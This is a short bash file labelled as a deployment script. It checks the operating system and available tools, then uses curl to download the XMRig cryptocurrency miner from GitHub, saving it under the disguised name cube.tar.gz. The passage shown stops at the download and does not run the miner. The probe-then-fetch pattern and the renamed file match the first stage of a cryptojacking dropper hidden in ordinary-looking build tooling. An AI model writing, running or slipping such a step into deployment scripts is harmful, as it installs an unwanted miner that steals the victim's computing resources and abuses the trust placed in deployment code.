#!/bin/bash

echo "Deployment script started"
cat /etc/os-release
which curl
which npm 
which node
which wget

curl https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz > cube.tar.gz